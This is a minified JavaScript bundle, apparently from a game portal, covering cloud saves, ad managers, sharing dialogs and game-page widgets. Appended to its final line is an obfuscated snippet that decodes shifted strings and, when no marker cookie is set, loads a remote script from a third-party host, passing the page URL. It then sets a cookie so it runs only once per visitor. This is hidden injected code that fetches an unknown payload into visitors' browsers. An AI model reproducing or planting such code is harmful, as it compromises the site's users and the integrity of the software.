Kongregate.SyncedSharedObjects(t,{}),cloudSaves.syncedSharedObjects=s,i||active_user.addRunWhenAuthenticatedObserver(Kongregate.CloudSavesController.userAuthenticated.bind(Kongregate.CloudSavesController))),o||(KONGREGATE.cloudSavesHandler.addModeDeterminedCallback(Kongregate.CloudSavesController.modeDetermined.bind(Kongregate.CloudSavesController)),KONGREGATE.cloudSavesHandler.addConflictCallback(Kongregate.CloudSavesController.handleConflict.bind(Kongregate.CloudSavesController)),o=!0),i&&(cloudSaves.mode="debug"),KONGREGATE.cloudSavesHandler.configure(cloudSaves)),e(n)},this.reloadCloudSaves=function(){this.refreshCloudData((function(){r.loadGame()}))},this.forceUpdate=function(){s.forceUpdate()},this.setSyncMode=function(e){KONGREGATE.cloudSavesHandler.configure({mode:e}),this.loadGame()},this.getSyncMode=function(){return KONGREGATE.cloudSavesHandler.getSyncMode()},this.upgradeToSync=function(e){"localOnly"!==this.getSyncMode()||e?e?r.refreshAndSync():KONGREGATE.cloudSavesHandler.flush((function(){r.refreshAndSync()})):(KONGREGATE.cloudSavesHandler.touchLocalMetadata(),this.setSyncMode("sync"))},this.reloadGame=function(){KONGREGATE.cloudSavesHandler.clearConfig(),this.loadGame()},this.refreshAndSync=function(){r.refreshCloudData((function(){KONGREGATE.cloudSavesHandler.zeroLocalMetadata(),r.setSyncMode("sync")}))}};var GameMetricsUpdater={update:function(){new Ajax.Request(active_user.gameResourcePath()+"/metrics.json",{method:"get",onSuccess:function(e){[[".favorites_count",(e=e.responseJSON).favorites_count_with_delimiter],[".gameplays_count",e.gameplays_count_with_delimiter],["#game_statistics",e.game_statistics],[".average_rating",e.average_rating_text],[".average_rating_with_count",e.average_rating_with_count],["#rating_message",e.rating_message],["#below_game_rating_message",e.below_game_rating_message],["#star_ratings_block",e.user_rating],["#below_game_star_ratings_block",e.below_game_user_rating],["#quicklinks_star_ratings_block",e.quicklinks_user_rating],[".flag_game",e.flagged],["#favorite_game",e.favorite_message],["#below_game_favorite_game",e.below_game_favorite_message],["#quicklinks_favorite_block",e.quicklinks_favorite_message],["#quicklinks_play_later_block",e.quicklinks_play_later_message],["#below_game_play_later_block",e.below_game_play_later_message],["#user_donation_holder",e.last_tip_message],["#combined_favorites_js",e.combined_favorites_js],["#game_block",e.block_game_js]].each((function(e){var t=e[0],i=e[1];i&&$$(t).each((function(e){e.update(i)}))})),holodeck._user_rating=e.user_rating_value},onFailure:function(e){console.error("Error loading game metrics: %o",e.responseText)}})}};function IMAVideoBumper(e){this.initialize(e)}function PlaywireAdManager(){return this.__events={},this.contentDiv="playwire-container",this instanceof PlaywireAdManager?PlaywireAdManager.hasOwnProperty("instance")?PlaywireAdManager.instance:void Object.defineProperty(PlaywireAdManager,"instance",{value:this,enumerable:!1,writable:!1,configurable:!1}):new PlaywireAdManager}function GameLoadObserver(e){this.initialize(e)}function ShareWithUsersTab(e,t,i){this.initialize(e,t,i)}function ShareWithFriendsDialog(e){this.initialize(e)}function GameDiscussions(e){this.initialize(e)}HyprMXAdManager=function(e){this.initialize(e)},HyprMXAdManager.AD_AVAILABLE_URL="https://live.hyprmx.com/embedded_offers/videos_available_jsonp?",HyprMXAdManager.EMBED_AD_URL="https://live.hyprmx.com/embedded_offers/player?",HyprMXAdManager.AD_COMPLETE_WAIT_TIME=5e3,HyprMXAdManager.prototype={initialize:function(e){this._distributorId=e.distributorId,this._site=e.site,this._enabled=!(!e.distributorId||!e.enabled||Prototype.Browser.IE7||Prototype.Browser.IE8),this._serviceNotified=this._adCompleted=!1},setReceiver:function(e){this._receiver=e},readyForAds:function(){this._enabled&&this._distributorId&&this._checkForAds()},handleHyprMXResponse:function(e){e?(Kongregate.Log.info("HyprMX: ad available"),this._receiver.onCampaignsReady()):(Kongregate.Log.info("HyprMX: no ad available for this user"),this._receiver.onNoAdAvailable())},onAdComplete:function(){Kongregate.Log.info("HyprMX ad complete!"),this._adCompleted=!0,this._trackMetricsEvent("IncentivizedAdFinish"),this._receiver.onCampaignCompleted(),this._loadPostAdContentIntoLightbox()},onAdClose:function(){Kongregate.Log.info("HyprMX ad closed"),this._serviceNotified||(this._receiver.onCampaignClose(),this._serviceNotified=!0,this._adCompleted||this._trackMetricsEvent("IncentivizedAdAbandon")),this._checkForAds()},showAd:function(){this._serviceNotified=this._adCompleted=!1,Kongregate.Log.info("HyprMX: show ad");var e={distributorid:this._distributorId,uid:active_user.siteVisitorUID(),partner_code:active_user.gameId(),site:this._site};e=HyprMXAdManager.EMBED_AD_URL+Object.toQueryString(e),this._trackMetricsEvent("IncentivizedAdStart");var t=this;lightbox.prototype.initializeHyprMXVideoFrame(e,(function(){t.onAdClose()}),{width:800,height:550})},_checkForAds:function(){var e={distributorid:this._distributorId,uid:active_user.siteVisitorUID()};e=HyprMXAdManager.AD_AVAILABLE_URL+Object.toQueryString(e),this._loadScript(e)},_loadScript:function(e){$j.getScript(e)},_loadPostAdContentIntoLightbox:function(){var e=$j("<div>",{id:"hyprmx_complete"});e.append($j("<p>").text("Thanks for watching!"));var t=$j("<input>",{type:"button",value:"Close"});t.addClass("btn btn_action"),t.click((function(){lightbox.prototype.shutdown()})),e.append(t),setTimeout((function(){lightbox&&lightbox.prototype&&lightbox.prototype.updateWithContent(e),$j("#lightbox").removeClass("hyprmx_video").addClass("lightbox_login")}),HyprMXAdManager.AD_COMPLETE_WAIT_TIME)},_trackMetricsEvent:function(e){"undefined"!=typeof metricTracker&&metricTracker.trackEvent("GamePage",e)}},IMAVideoBumper.AD_BLOCK_TIMEOUT=5e3,IMAVideoBumper.CLOSE_LINK_TIMEOUT=1e4,IMAVideoBumper.ON_COMPLETE_PAUSE=1e3,IMAVideoBumper.CLOSE_LINK_FADE_IN=1e3,IMAVideoBumper.FAILSAFE_TIMEOUT=12e4,IMAVideoBumper.prototype={initialize:function(e){this._targetingParams=e.targetingParams,this._baseUrl=e.baseUrl,this._metricTracker=e.metricTracker,this._topKredsGame=!1,this._provider=PlaywireAdManager().isEnabled()?"playwire":"google",this._targetingParams&&this._targetingParams.gamegroup&&(this._targetingParams.gamegroup.include("top-kreds")&&(this._topKredsGame=!0),this._targetingParams.gamegroup.include("no-preroll")&&(this._suppressPrerollGroup=!0))},loadGame:function(e){e&&this.getsBumper()?this.showPreroll():this.onComplete()},hasBadIEVersion:function(){return Prototype.Browser.IE9||Prototype.Browser.IE8||Prototype.Browser.IE7},suppressForTopKredsGame:function(){return!!this._topKredsGame&&active_user.inTopKredGracePeriod()},getsBumper:function(){return!(this._suppressPrerollGroup||this.hasBadIEVersion()||active_user.getsRegistrationLightbox()||active_user.isPremium()||this.suppressForTopKredsGame())},showPreroll:function(){this.trackEvent("PrerollInitiated"),this.adBlockTimeout=setTimeout(this.abortAd.bind(this),IMAVideoBumper.AD_BLOCK_TIMEOUT),this.failsafeTimeout=setTimeout(this.reachedFailsafe.bind(this),IMAVideoBumper.FAILSAFE_TIMEOUT),$j("#noflash").is(":visible")&&(this.hidFlashMessage=!0,$j("#noflash").hide()),$j("#bumper_premium_header").show(),$j("#ad_skip_controls").show(),"playwire"==this._provider?PlaywireAdManager().show():$j("#ima_bumper").show(),$j("#game").css("visibility","hidden"),$j("#bumper_premium_header").show(),preloadGame(),"playwire"==this._provider?(clearTimeout(this.adBlockTimeout),this.initPlaywire()):(this.createAdPlayer(),this.player.play())},initPlaywire:function(){PlaywireAdManager().initialize(),PlaywireAdManager().addEventListener(PlaywireAdManager.AD_ABORTED,this.abortAd.bind(this)),PlaywireAdManager().addEventListener(PlaywireAdManager.AD_COMPLETE,this.onAdEnd.bind(this))},createAdPlayer:function(){this.player=videojs("ima_bumper"),this.player.ima({id:"ima_bumper",debug:null===window.location.hostname.match(/kongregate\.com/),adTagUrl:this.createAdTagUrl()}),this.setupEventListeners(),this.player.ima.requestAds();var e=$j("#game").height()-$j("#bumper_premium_header").height()-$j("#ad_skip_controls").height();$j("#ima_bumper").css("height",e)},createAdTagUrl:function(){return this._convertTargetingArraysToStrings(),this.adTagUrl=this._baseUrl+"&cust_params="+encodeURIComponent(decodeURIComponent($j.param(this._targetingParams)))},setupEventListeners:function(){this.player.on("adend",this.onAdEnd.bind(this)),this.player.on("adserror",this.onComplete.bind(this)),this.player.on("adsready",this.onAdsReady.bind(this))},trackEvent:function(e){this._metricTracker&&this._metricTracker.trackEvent("GamePage",e)},onAdsReady:function(){this.trackEvent("PrerollAdsReady"),clearTimeout(this.adBlockTimeout),active_user.isAuthenticated()&&!active_user.inCloseLinkTest()&&setTimeout(this.showCloseLink,IMAVideoBumper.CLOSE_LINK_TIMEOUT)},onAdEnd:function(){this.trackEvent("PrerollEnded"),this.clearFailsafeTimeout(),this.onComplete()},showCloseLink:function(){var e=$j("#bumper_close_link");e.click((function(){setTimeout(window.imaVideoBumper.closeAd.bind(window.imaVideoBumper),0)})),e.fadeIn(IMAVideoBumper.CLOSE_LINK_FADE_IN)},abortAd:function(){this.trackEvent("PrerollAdLoadAborted"),this.clearFailsafeTimeout(),this.onComplete()},closeAd:function(){this.trackEvent("PrerollAdSkipped"),this.clearFailsafeTimeout(),this.onComplete()},reachedFailsafe:function(){this.trackEvent("PrerollFailsafeTimeoutReached"),this.onComplete()},clearFailsafeTimeout:function(){clearTimeout(this.failsafeTimeout)},onComplete:function(){var e=this;setTimeout(function(){$j("#bumper_premium_header").remove(),"playwire"==this._provider&&PlaywireAdManager().remove();try{$j("#ima_bumper").remove()}catch(e){}$j("#ad_skip_controls").remove(),$j("#game").css("visibility","visible"),activateGame(),e.hidFlashMessage&&$j("#noflash").show()}.bind(this),IMAVideoBumper.ON_COMPLETE_PAUSE)},_convertTargetingArraysToStrings:function(){var e=this;$j.each(this._targetingParams,(function(t,i){Array.isArray(i)&&(e._targetingParams[t]=i.join(","))}))}},PlaywireAdManager.PLAYER_DIV="pre-content-player",PlaywireAdManager.AD_STARTED="ad_started",PlaywireAdManager.AD_ABORTED="ad_aborted",PlaywireAdManager.AD_COMPLETE="ad_complete",PlaywireAdManager.CONTAINER_HIDDEN="ad_container_hidden",PlaywireAdManager.boltPrerolEventHandlers=function(){Bolt.on(PlaywireAdManager.PLAYER_DIV,Bolt.BOLT_AD_STARTED,(function(){var e=new CustomEvent(PlaywireAdManager.AD_STARTED,{});PlaywireAdManager().dispatchEvent(e)})),Bolt.on(PlaywireAdManager.PLAYER_DIV,Bolt.BOLT_AD_COMPLETE,(function(){var e=new CustomEvent(PlaywireAdManager.AD_COMPLETE,{});PlaywireAdManager().dispatchEvent(e)})),Bolt.on(PlaywireAdManager.PLAYER_DIV,"showHiddenContainer",(function(){var e=new CustomEvent(PlaywireAdManager.CONTAINER_HIDDEN,{});PlaywireAdManager().dispatchEvent(e)})),Bolt.on(PlaywireAdManager.PLAYER_DIV,Bolt.BOLT_AD_ERROR,(function(){var e=new CustomEvent(PlaywireAdManager.AD_ABORTED,{});PlaywireAdManager().dispatchEvent(e)}))},PlaywireAdManager.prototype={isEnabled:function(){return window.playwirePrerollEnabled},initialize:function(){this.config="//config.playwire.com/1024483/v2/pre_content.json",this.container=window.document.getElementById(this.contentDiv);var e=window.document.createElement("script");e.type="text/javascript",e.src="//cdn.playwire.com/bolt/js/zeus/embed.js",e.setAttribute("data-config",this.config),e.setAttribute("data-width","100%"),e.setAttribute("data-height","100%"),e.setAttribute("data-id",PlaywireAdManager.PLAYER_DIV),e.setAttribute("data-hidden-container","no-op-id"),e.setAttribute("data-onready","PlaywireAdManager.boltPrerolEventHandlers"),this.container.appendChild(e)},addEventListener:function(e,t){var i=this.__events[e];i||(i=[],this.__events[e]=i),i.push(t)},removeEventListener:function(e,t){var i=this.__events[e];i&&(t=i.indexOf(t),i.splice(t,1),0===i.length&&(this.__events[e]=null))},dispatchEvent:function(e){var t=this.__events[e.type];if(t)for(var i in t)setTimeout(t[i].call(null,e),0)},show:function(){$j("#"+this.contentDiv).show()},hide:function(){$j("#"+this.contentDiv).hide()},remove:function(){$j("#"+this.contentDiv).remove()}},GameLoadObserver.prototype={initialize:function(e){this._loaded=!1,this._startTime=(new Date).getTime(),this._timeout=e.timeout||3e3,this._interval=null,this._debug=e.debug,this._queue=[],this.startObserving.bind(this).runWhenDomLoaded()},percentLoaded:function(){if($("gamediv"))try{return $("gamediv").PercentLoaded()}catch(e){return-1}},observeGameLoad:function(){var e=(new Date).getTime()-this._startTime,t=e>=this._timeout,i=this.percentLoaded();0<i||t?(this._debug&&console.log("Firing onGameLoaded, percentLoaded: "+i+", timeElapsed: "+e+", timedOut: "+t),this.onGameLoaded()):0>i&&(this._debug&&console.log("Firing onGameLoaded, no flash gamediv found, percentLoaded: "+i+", timeElapsed: "+e),this.onGameLoaded())},onGameLoaded:function(){this._loaded||(this._loaded=!0,clearInterval(this._interval),this._queue.each((function(e){e.defer()})),this._queue=[])},runWhenGameLoaded:function(e){this._loaded?e.defer():this._queue.push(e)},startObserving:function(){this._interval&&clearInterval(this._interval),this._interval=setInterval(this.observeGameLoad.bind(this),100)}},Function.prototype.runWhenGameLoaded=function(){window.gameLoadObserver?window.gameLoadObserver.runWhenGameLoaded(this):this.runWhenDomLoaded()},window.gameLoadObserver=new GameLoadObserver({timeout:2e3,debug:!1}),ShareWithUsersTab.prototype={initialize:function(e,t,i){this._share_dialog=t,this._tab_id=e,this._current_page=0,this._request_more_func=i,(e=$(e+"_tab"))&&e.observe("click",this.handleShowTab.bindAsEventListener(this))},getMore:function(){this._current_page++,this._request_more_func(),$(this._tab_id+"_indicator").show()},handleShowTab:function(e){this.refreshSelected()},handleScroll:function(e){$(this._tab_id).scrollTop+$(this._tab_id).getHeight()>=$(this._tab_id).scrollHeight&&(Event.stopObserving($(this._tab_id),"scroll"),this.getMore())},onRequestSuccess:function(){$(this._tab_id).observe("scroll",this.handleScroll.bindAsEventListener(this))},onRequestComplete:function(){$(this._tab_id+"_indicator").hide(),this.refreshSelected()},refreshSelected:function(){for(var e=$(this._tab_id).select(".user"),t=0;t<e.length;++t){var i=e[t].select("#recipient_ids_").first();i.checked=this._share_dialog.isSelected(i.value),this._share_dialog.isSelected(i.value)?e[t].addClassName("selected"):e[t].removeClassName("selected")}}},ShareWithFriendsDialog.prototype={initialize:function(e){this._selected_users=[],this._user_limit=e,this._error_msg_timer=this._search_box_timer=null,$("max_users_error").hide(),$("new_game_invite_feed_item").setAttribute("action","javascript:;")},setRequestFunctions:function(e,t,i){this._friends_tab=new ShareWithUsersTab("share_with_friends",this,e),this._friends_tab.getMore(),this._fans_tab=new ShareWithUsersTab("share_with_fans",this,t),this._fans_tab.getMore(),this._chat_members_tab=new ShareWithUsersTab("share_with_chat_members",this,i),this._chat_members_tab.getMore()},toggleSelected:function(e,t){var i=this.findSelected(e),n=!1;return-1<i?(this._selected_users.splice(i,1),n=!0,$("error_messages").update("")):this._selected_users.length<this._user_limit?(this._selected_users.push({user_id:e,username:t}),n=!0,$("error_messages").update("")):this._selected_users.length>=this._user_limit&&($("max_users_error").show(),$("max_users_error").removeClassName("hidden"),null!==this._error_msg_timer&&clearTimeout(this._search_box_timer),this._error_msg_timer=setTimeout((function(){this._error_msg_timer=null,$("max_users_error").hide()}),2500)),this.friends_tab&&this._friends_tab.refreshSelected(),this._fans_tab&&this._fans_tab.refreshSelected(),this._chat_members_tab&&this._chat_members_tab.refreshSelected(),$("selected_users").update(this.selectedUsersMessage()),$("recipients").value=this.getSelectedUserIds(),n},selectedUsersMessage:function(){var e=this._selected_users.length;return 0===e?"no users selected":1==e?this._selected_users[0].username+" selected":2==e?this._selected_users[0].username+" and "+this._selected_users[1].username+" selected":3==e?this._selected_users[0].username+", "+this._selected_users[1].username+" and "+this._selected_users[2].username+" selected":4==e?this._selected_users[0].username+", "+this._selected_users[1].username+", "+this._selected_users[2].username+" and 1 other user selected":this._selected_users[0].username+", "+this._selected_users[1].username+", "+this._selected_users[2].username+" and "+(e-3)+" other users selected"},refreshSearchDropdown:function(){for(var a=$$(".recipient_chooser").first().select(".user"),b=0;b<a.length;++b){var c=eval("("+a[b].down(".metadata").innerHTML+")");this.isSelected(c.user_id)?a[b].addClassName("chosen"):a[b].removeClassName("chosen")}},searchUserSelected:function(e){var t=shareWithFriendsDialog.toggleSelected(e.user_id,e.username);$("recipient_search").value="",t&&($("recipient_search_container").hide(),this.isSelected(e.user_id)?$("recipient_list_updated_msg").innerHTML=e.username+" was added to the recipient list":$("recipient_list_updated_msg").innerHTML=e.username+" was removed from the recipient list",$("recipient_list_updated_msg").show(),null!==this._search_box_timer&&clearTimeout(this._search_box_timer),this._search_box_timer=setTimeout((function(){this._search_box_timer=null,$("recipient_list_updated_msg").hide(),$("recipient_search_container").show()}),2500))},findSelected:function(e){for(var t=0;t<this._selected_users.length;t++)if(this._selected_users[t].user_id==e)return t;return-1},isSelected:function(e){return-1<this.findSelected(e)},getSelectedUserIds:function(){for(var e="",t=0;t<this._selected_users.length;++t)e+=this._selected_users[t].user_id,t+1<this._selected_users.length&&(e+=",");return e}},SharedLinksController=function(e){this.container=$(e.id),this.select=this.container.down("select"),this.checkbox=this.container.down("input[type=checkbox]"),this.reload=this.container.down(".shared_link_reload"),this.url=e.url,this.out_of_links=this.fetching=!1,this.shown_items=0,this.addFormHandlers(),this.addShowMoreHandler(),this.addScrollHandler()},SharedLinksController.prototype={fetch:function(e){if(!this.fetching){this.fetching=!0;var t=this,i=this.container.down("ul");$("shared_link_list_container");var n=this.select.getValue();e||(e={}),"All"!=n&&(e.shared_link_type_id=n),new Ajax.Request(t.url,{method:"get",parameters:e,onCreate:function(){i.insert(new Element("li",{id:"shared_links_loading"}).insert(new Element("span",{class:"spinner spinner_big"}).update("Loading..."))),t.hideShowMoreLink()},onComplete:function(){$("shared_links_loading").remove(),t.fetching=!1},onSuccess:function(e){var n;(e=$A(e.responseJSON)).each((function(e){n=t.renderLink(e),i.insert(n),!t.showHidden()&&n.hasClassName("visited")||t.shown_items++})),0<e.length&&(t.maxId=e.last().id),t.showShowMoreLink(),25>e.length?(t.out_of_links=!0,t.shown_items=0):(t.out_of_links=!1,17>t.shown_items?(t.fetching=!1,t.fetch({max_id:t.maxId})):t.shown_items=0)}})}},renderLink:function(e){var t=$.jStorage.get(this.storageKey(e)),i=new Element("li",{id:"shared_link_"+e.id,class:"shared_link"}),n=new Element("a",{class:"shared_title_link"}).update(e.name);if(t&&(i.addClassName("visited"),this.showHidden()||i.hide()),n.observe("click",this.handleClick.bindAsEventListener(this,e,i)),i.insert(new Element("div",{class:"shared_link_title truncate_one_line"}).insert(n)),i.observe("click",(function(){i.hasClassName("open")?i.removeClassName("open"):i.addClassName("open")})),e.additional_params){i.addClassName("expandable");var s=new Element("dl",{class:"link_info mvm"});$H(e.additional_params.evalJSON()).each((function(e){s.insert(new Element("dt",{class:"truncate_one_line"}).update(e.key.stripTags())),s.insert(new Element("dd",{class:"truncate_one_line"}).update(e.value.toString().stripTags()))})),i.insert(s)}return i},handleClick:function(e,t,i){$("gameiframe")?activateGame(t.link_params):(e=$H(document.location.search.toQueryParams()).merge(t.link_params.toQueryParams()).toQueryString(),window.open(document.location.pathname+"?"+e,"_blank")),$.jStorage.set(this.storageKey(t),!0,{TTL:t.ttl}),i.addClassName("visited"),this.showHidden()||i.hide()},addFormHandlers:function(){var e=this.container.down("ul");this.select.observe("change",function(){e.update(),this.maxId=0,this.hideShowMoreLink(),this.fetch()}.bind(this)),this.reload.observe("click",function(){e.update(),this.maxId=0,this.hideShowMoreLink(),this.fetch()}.bind(this)),this.checkbox.observe("change",function(){e.select("li.visited").invoke("Y"==this.checkbox.getValue()?"show":"hide")}.bind(this))},addShowMoreHandler:function(){$("shared_link_show_more").observe("click",function(){this.fetch({max_id:this.maxId}),this.hideShowMoreLink()}.bind(this))},showShowMoreLink:function(){$("shared_link_show_more").show()},hideShowMoreLink:function(){$("shared_link_show_more").hide()},storageKey:function(e){return active_user.gameId()+"-"+e.id},addScrollHandler:function(){var e=$("shared_link_show_more"),t=0,i=$("shared_link_list_container");i.observe("scroll",function(){var n=0===i.scrollTop?i.parentNode.scrollTop:i.scrollTop;!this.out_of_links&&n+window.innerHeight>e.positionedOffset().top&&n>t&&this.fetch({max_id:this.maxId}),t=n}.bind(this))},showHidden:function(){return"Y"==this.checkbox.getValue()}},SupersonicAdManager=function(e){this.initialize(e)},SupersonicAdManager.prototype={initialize:function(e){if(this._key=e.key,this._element=e.element,this._enabled=!(!e.key||!e.enabled||Prototype.Browser.IE7||Prototype.Browser.IE8),this._adCompleted=!1,"gamediv"===this._element){var t=this;window.readyForAds=function(){t.readyForAds()}}},setReceiver:function(e){this._receiver=e},readyForAds:function(){if(this._enabled){var e=this;this._receiver||(this._receiver=$j("#"+this._element)[0]),window.ssa_json={applicationUserId:active_user.siteVisitorUID(),applicationKey:this._key,fitToFrame:!0,verticalAlign:"top",scrollToEngagement:!0,onCampaignsReady:function(){e._receiver.onCampaignsReady.apply(e._receiver,arguments)},onCampaignsDone:function(){e._receiver.onCampaignsDone.apply(e._receiver,arguments)},onCampaignOpen:function(){e._adCompleted=!1,lightbox.prototype.hideHiddenElements(),"undefined"!=typeof metricTracker&&metricTracker.trackEvent("GamePage","IncentivizedAdStart")},onCampaignCompleted:function(){e._receiver.onCampaignCompleted.apply(e._receiver,arguments),e._adCompleted=!0,"undefined"!=typeof metricTracker&&metricTracker.trackEvent("GamePage","IncentivizedAdFinish")},onCampaignClose:function(){lightbox.prototype.showHiddenElements(),e._receiver.onCampaignClose.apply(e._receiver,arguments),e._adCompleted||"undefined"==typeof metricTracker||metricTracker.trackEvent("GamePage","IncentivizedAdAbandon")}},this._loadScript()}},showAd:function(){this._enabled&&"undefined"!=typeof SSA_CORE&&SSA_CORE.BrandConnect.engage(),lightbox.prototype.dispatchLightboxOpened({width:700,height:800})},_loadScript:function(){var e=document.createElement("script"),t=document.getElementsByTagName("script")[0];e.async=!0,e.src="https://a248.e.akamai.net/ssastatic.s3.amazonaws.com/inlineDelivery/delivery.min.gz.js",t.parentNode.insertBefore(e,t)}},TrueXAdManager=function(e){this.initialize(e)},TrueXAdManager.prototype={initialize:function(e){this._key=e.key,this._enabled=!(!e.key||!e.enabled||Prototype.Browser.IE7||Prototype.Browser.IE8),this._adCompleted=!1,this._truexActivity=this._truexClient=null,this._serviceNotified=!1},setReceiver:function(e){this._receiver=e},readyForAds:function(){this._enabled&&this._loadScript()},showAd:function(){this._serviceNotified=!1,Kongregate.Log.info("TrueX: show ad");var e=this,t=this._truexActivity;lightbox.prototype.initializeTrueXVideoFrame((function(){e._truexClient.loadActivityIntoContainer(t,"truex_target")}),e.onAdClose.bind(e),{width:960,height:600})},onAdClose:function(){this._serviceNotified||(this._receiver.onCampaignClose.apply(this._receiver,arguments),this._serviceNotified=!0,this._adCompleted||this._trackMetricsEvent("IncentivizedAdAbandon")),lightbox.prototype.shutdown()},onCreditEvent:function(e){if(e&&e.signature_argument_string&&e.signature){var t=this;$j.post("/truex_ad_engagements/verify_signature",{sig_string:e.signature,arg_string:e.signature_argument_string},(function(){t._adCompleted=!0,t._receiver.onCampaignCompleted.apply(t._receiver,arguments),t._trackMetricsEvent("IncentivizedAdFinish"),Kongregate.Log.info("TrueX: ad credit received and verified"),t._setUpClient()}))}},_trackMetricsEvent:function(e){"undefined"!=typeof metricTracker&&metricTracker.trackEvent("GamePage",e)},_setUpClient:function(){var e={network_user_id:active_user.siteVisitorUID(),partner_config_hash:this._key,game_id:active_user.gameId(),dimension_1:active_user.gameId()},t=this;truex.client(e,(function(e){t._truexClient=e,t._truexClient.requestActivity((function(e){e?(t._truexActivity=e,e.onStart((function(e){t._adCompleted=!1,t._trackMetricsEvent("IncentivizedAdStart")})),e.onFinish((function(e){Kongregate.Log.info("TrueX: ad finish")})),e.onCredit((function(e){t.onCreditEvent(e)})),e.onClose((function(){t.onAdClose()})),t._receiver.onCampaignsReady.apply(t._receiver,arguments)):(Kongregate.Log.info("TrueX: No activity available for this user"),t._receiver.onNoAdAvailable())}))}))},_loadScript:function(){var e,t,i,n,s=this;e=document,t="script",i=e.createElement(t),n=e.getElementsByTagName(t)[0],i.async=!0,i.src="https://static.truex.com/js/client.js",i.readyState?i.onreadystatechange=function(){"loaded"!=i.readyState&&"complete"!=n.readyState||(i.onreadystatechange=null,s._setUpClient())}:i.onload=function(){s._setUpClient()},n.parentNode.insertBefore(i,n)}},GameDiscussions.prototype={initialize:function(e){this.gameUrl=e.gameUrl,this.inGuilds=e.inGuilds,this.hasGameSpecificForum=e.hasGameSpecificForum},loadForum:function(){new Ajax.Request(this.gameUrl+"/forum",{method:"get",onSuccess:function(e){$("latest_posts").update(e.responseText)}})},loadGuildForum:function(){new Ajax.Request(this.gameUrl+"/forum/guild",{method:"get",onSuccess:function(e){$("guild_posts_container").update(e.responseText).select(".game_tab_index > :first-child, .game_tab_group > :first-child").invoke("addClassName","active")}})},loadDiscussions:function(){this.hasGameSpecificForum&&this.loadForum(),this.inGuilds&&this.loadGuildForum()},setupTabs:function(){var e=this;$$(".game_discussions .game_tab_index").each((function(t){!0!==e.inGuilds&&($(t).down(".game_tab_item",0).removeClassName("active"),$(t).down(".game_tab_item",1).addClassName("active"))})),$$(".game_discussions .game_tab_group").each((function(t){!0!==e.inGuilds&&($(t).down(".tab",0).removeClassName("active"),$(t).down(".tab",1).addClassName("active"))}))}},function(e){function t(t){if(t.valueExtensions)return!0;if(("INPUT"!==t.nodeName||"text"!==t.type&&"password"!==t.type)&&"TEXTAREA"!==t.nodeName)return!1;if(t.valueExtensions={current:null},t.constructor&&t.constructor.prototype){var i=Object.getOwnPropertyDescriptor(t.constructor.prototype,"value");Object.defineProperty(t,"value",{get:function(){return i.get.call(this)},set:function(e){t.valueExtensions.current=e,i.set.call(this,e)}})}return e(t).on("propertychange",s).on("dragend",(function(e){window.setTimeout((function(){s(e)}),0)})),!0}function i(){var t,i=a;a=[];var n=0;for(t=i.length;n<t;n+=1){var s=i[n],o=s.value;s.valueExtensions.current!==o&&(s.valueExtensions.current=o,e(s).trigger("textchange"))}}function n(){o&&(e(o).off("keyup keydown",s),o=null)}if(void 0!==document.createElement("input").oninput&&9<(document.documentMode||100))e(document).on("input",(function(t){e(t.target).trigger("textchange")}));else{var s=null,o=null,a=[];s=function(e){if(t(e=e.target)&&e.valueExtensions.current!==e.value){var n,s=0;for(n=a.length;s<n&&a[s]!==e;s+=1);s>=n&&(a.push(e),0===n&&window.setTimeout(i,0))}},e(document).on("focusin",(function(i){n(),t(i.target)&&(o=i.target,e(o).on("keyup keydown",s))})).on("focusout",n).on("input",s).on("selectionchange",(function(e){if(document.selection){var t=document.selection.createRange();t&&(t=t.parentElement())&&(e.target=t,s(e))}}))}}(jQuery);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));